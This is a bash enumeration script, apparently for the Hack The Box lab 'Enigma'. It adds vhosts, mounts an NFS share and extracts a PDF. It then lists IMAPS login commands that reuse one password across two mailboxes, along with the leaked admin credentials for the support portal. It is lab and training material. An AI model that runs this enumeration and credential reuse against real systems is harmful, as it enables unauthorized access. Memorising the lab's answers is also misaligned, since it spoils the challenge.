#!/usr/bin/env bash
# HTB Enigma - Phase 1: recon + NFS + mail enumeration
# Usage: ./01_enum.sh <TARGET_IP> [ATTACKER_IP]
set -euo pipefail

IP="${1:?usage: $0 <TARGET_IP> [ATTACKER_IP]}"
MNT=/mnt/enigma

echo "=============================================="
echo "  HTB Enigma enumeration  ->  $IP"
echo "=============================================="

# --- 0. /etc/hosts (needs sudo) ---
if ! grep -q "enigma.htb" /etc/hosts 2>/dev/null; then
  echo "[*] adding vhosts to /etc/hosts (sudo required)"
  sudo sh -c "echo '$IP enigma.htb mail001.enigma.htb support_001.enigma.htb' >> /etc/hosts"
else
  echo "[*] vhosts already in /etc/hosts"
fi

# --- 1. NFS export ---
echo
echo "[*] NFS exports:"
showmount -e "$IP" || { echo "!! showmount failed"; exit 1; }

# --- 2. Mount onboarding share ---
echo
echo "[*] mounting /srv/nfs/onboarding -> $MNT"
sudo mkdir -p "$MNT"
sudo mount -t nfs "$IP:/srv/nfs/onboarding" "$MNT" -o nolock
ls -la "$MNT"

# --- 3. Extract PDF text ---
echo
echo "[*] PDF contents:"
PDF=$(find "$MNT" -iname '*.pdf' | head -1)
if [ -n "$PDF" ]; then
  echo "    file: $PDF"
  if command -v pdftotext >/dev/null; then
    pdftotext "$PDF" - 2>/dev/null || strings "$PDF"
  else
    echo "!! pdftotext missing (apt install poppler-utils). raw strings:"
    strings "$PDF" | head -40
  fi
else
  echo "!! no PDF found"
fi

cat <<'EOF'

==============================================
  NEXT: mailbox pivot via IMAPS (993)
==============================================
# kevin's mailbox
openssl s_client -connect <IP>:993 -quiet
  a1 LOGIN kevin Enigma2024!
  a2 SELECT INBOX
  a3 FETCH 1:* (BODY[TEXT])

# sarah reuses the SAME password -> support portal admin creds
openssl s_client -connect <IP>:993 -quiet
  a1 LOGIN sarah Enigma2024!
  a2 SELECT INBOX
  a3 FETCH 1:* (BODY[TEXT])

# Expected leak from sarah's mail:
#   URL:      http://support_001.enigma.htb
#   Username: admin
#   Password: Ne3s4rtars78s
EOF
